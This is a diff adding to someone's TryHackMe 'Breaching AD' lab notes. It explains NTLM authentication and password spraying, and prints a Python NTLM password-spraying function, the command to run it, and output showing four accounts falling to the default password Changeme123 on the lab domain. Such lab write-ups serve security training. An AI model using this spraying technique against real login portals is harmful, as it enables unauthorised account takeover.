@@ -87,6 +87,10 @@ Common issue:
 
 ```
 root@ip-10-48-119-205:~# sudo nano /etc/resolv.conf
+# here first line
+# nameserver <thmdc_IP_goes_here>
+#if tryhackme domain name is required to be accessed
+# nameserver 8.8.8.8 
 
 root@ip-10-48-119-205:~# nslookup thmdc
 ;; Got SERVFAIL reply from 10.200.70.101
@@ -150,3 +154,119 @@ Phishing remains one of the most effective ways to obtain AD credentials. Two co
 - Victims run a malicious file that installs a Remote Access Trojan (RAT).
 
 A RAT runs under the user’s security context, giving the attacker immediate access to that user’s AD account. This is why phishing is a major focus for both offensive and defensive teams.
+
+## Task 3 NTLM Authenticated Services & Password Spraying
+
+Downloadable files one the python script below and usernames as well (first.lastname format)
+
+### NTLM & NetNTLM Authentication
+
+- NTLM is a suite of Microsoft authentication protocols used in Active Directory.
+- NetNTLM is the challenge‑response mechanism used by NTLM. It allows applications (like OWA, VPN portals, RDP gateways, web apps) to forward authentication challenges to a Domain Controller instead of validating credentials themselves.
+- This means the application acts as a middle‑man, never storing AD credentials locally.
+
+
+### Why NetNTLM Matters for Attackers
+
+Many NetNTLM‑enabled services are exposed to the internet:
+
+- Outlook Web App (OWA)
+- RDP endpoints
+- VPN portals integrated with AD
+- Web apps using Windows Authentication
+
+These endpoints allow attackers to test credentials found via OSINT or phishing.
+
+### Brute‑Force vs Password Spraying
+
+- Full brute‑force attacks are usually impossible due to account lockout policies.
+
+- Password spraying avoids lockouts by:
+    1. Trying one password across many usernames.
+    2. Useful when OSINT reveals:
+       Valid usernames
+       Default onboarding passwords (e.g., Changeme123)
+
+Detection Note
+
+Password spraying generates many failed logins and can be detected by Blue Teams.
+
+### Provided Python Password Spraying Script
+The script attempts NTLM authentication against a target URL and checks HTTP response codes:
+
+200 OK → valid credentials
+
+401 Unauthorized → invalid credentials
+
+Code (unchanged):
+```
+def password_spray(self, password, url):
+    print ("[*] Starting passwords spray attack using the following password: " + password)
+    #Reset valid credential counter
+    count = 0
+    #Iterate through all of the possible usernames
+    for user in self.users:
+        #Make a request to the website and attempt Windows Authentication
+        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
+        #Read status code of response to determine if authentication was successful
+        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
+            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
+            count += 1
+            continue
+        if (self.verbose):
+            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
+                print ("[-] Failed login with Username: " + user)
+    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
+```
+
+🔧 Running the Script
+Command:
+```
+python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a
+http://ntlmauth.za.tryhackme.com
+```
+
+Parameters:
+- usernames.txt → list of discovered usernames
+- za.tryhackme.com → AD domain
+- Changeme123 → default onboarding password
+- http://ntlmauth.za.tryhackme.com → NTLM‑enabled web app
+
+The script outputs valid credential pairs as it finds them.
+
+```
+root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# nano /etc/resolv-dnsmasq 
+root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# nano /etc/resolv.conf
+root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# nslookup thmdc.za.tryhackme.com
+Server:		10.200.70.101
+Address:	10.200.70.101#53
+
+Name:	thmdc.za.tryhackme.com
+Address: 10.200.70.101
+
+root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com
+[*] Starting passwords spray attack using the following password: Changeme123
+[-] Failed login with Username: anthony.reynolds
+[-] Failed login with Username: samantha.thompson
+[-] Failed login with Username: dawn.turner
+[-] Failed login with Username: frances.chapman
+[-] Failed login with Username: henry.taylor
+[-] Failed login with Username: jennifer.wood
+[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
+[-] Failed login with Username: louise.talbot
+[+] Valid credential pair found! Username: heather.smith Password: Changeme123
+[-] Failed login with Username: dominic.elliott
+[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
+[-] Failed login with Username: alan.jones
+[-] Failed login with Username: frank.fletcher
+[-] Failed login with Username: maria.sheppard
+[-] Failed login with Username: sophie.blackburn
+[-] Failed login with Username: dawn.hughes
+[-] Failed login with Username: henry.black
+[-] Failed login with Username: joanne.davies
+[-] Failed login with Username: mark.oconnor
+[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
+[*] Password spray attack completed, 4 valid credential pairs found
+root@ip-10-48-69-59:~/Rooms/BreachingAD/task3# 
+~~~
+
